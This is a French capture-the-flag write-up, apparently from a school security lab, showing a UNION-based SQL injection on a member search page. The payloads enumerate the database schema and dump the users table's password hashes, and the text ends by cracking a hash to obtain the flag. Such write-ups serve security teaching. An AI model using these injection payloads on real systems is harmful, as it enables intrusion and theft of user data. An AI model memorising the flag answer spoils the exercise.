### Member SQL injection

## Identification

Sur /index.php?page=member, on peut rechercher les membres par id. En testant on se rend compte que l'input n'est pas protégé et qu'on peut injecter du sql dans le where.
La requête SQL ressemble à ça: `SELECT first_name, surname FROM users where id_user = $id`

## Exploit

# Récupération des tables

On peut commencer par récupérer toute les tables présentes dans la database:
Input : `1 UNION SELECT 1, table_name FROM information_schema.tables`
Le `1,` ici permet simplement de récupérer autant de columns que dans le SELECT précédant (le SELECT du code d'index.php), c'est à dire 2 colonnes.
Output: ```
ID: 1 UNION SELECT 1, table_name FROM information_schema.tables 
First name: 1
Surname : CHARACTER_SETS
ID: 1 UNION SELECT 1, table_name FROM information_schema.tables 
First name: 1
Surname : COLLATIONS
ID: 1 UNION SELECT 1, table_name FROM information_schema.tables 
First name: 1
Surname : COLLATION_CHARACTER_SET_APPLICABILITY

ETC...
```
Nous retrouvons le nom des tables dans la colonne `surname`
On remarque que la table `users` est présente, et nous allons nous conentrer dessus

# Récupération des colonnes de la table `users`

Il faut maintenant récupérer les colonnes de la table `users`:
Input: `1 UNION SELECT table_name, column_name FROM information_schema.columns`
(Ici, pas besoin du `1,` car nous récupérons déjà 2 colonnes)
Output (avec un ctrl+f sur "users"): ```
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : user_id
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : first_name
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : last_name
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : town
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : country
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : planet
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : Commentaire
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : countersign
```
Pareil ici, on récupère toutes les colonnes de la table `users` dans `surname`.

# Récupération de toutes les infos utilisateurs

Il nous suffit maintenant de récupérer toute les données contenues dans la table `users`.
Comme nous récupérerons ici beaucoup de colonnes et que nous ne pouvons normalement qu'en récuperer que 2 avec le `UNION`, on doit utiliser un `concat()` pour concaténer la sortie de plusieurs colonnes en une seule. Pour la clareté, on ajouter un `\n`  entre chaque colonne:
Input: `1 union select 1, concat(user_id, 0x0a, first_name, 0x0a, last_name, 0x0a, town, 0x0a, country, 0x0a, planet, 0x0a, Commentaire, 0x0a, countersign) from users`
Output: ```
ID: 1 union select 1, concat(user_id, 0x0a, first_name, 0x0a, last_name, 0x0a, town, 0x0a, country, 0x0a, planet, 0x0a, Commentaire, 0x0a, countersign) from users 
First name: 1
Surname : 3
Joseph
Staline
Moscou
Russia
Earth
????? ????????????? ?????????
e083b24a01c483437bcf4a9eea7c1b4d

ID: 1 union select 1, concat(user_id, 0x0a, first_name, 0x0a, last_name, 0x0a, town, 0x0a, country, 0x0a, planet, 0x0a, Commentaire, 0x0a, countersign) from users 
First name: 1
Surname : 5
Flag
GetThe
42
42
42
Decrypt this password -> then lower all the char. Sh256 on it and it's good !
5ff9d0165b4f92b14994e5c685cdce28

ETC...
```
On remarque qu'un `user` nommé `Flag` existe, un hash est présent dans la colonne `countersign` et des instructions sont présentes dans la colonne `Commentaire`

# Récupérer le flag

Avec une rapide recherche internet, on découvre que `5ff9d0165b4f92b14994e5c685cdce28`, et une fois déchiffré, nous donne `FortyTwo`.
Il nous suffit de la lower de le sha256 : `sha256(fortytwo) = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

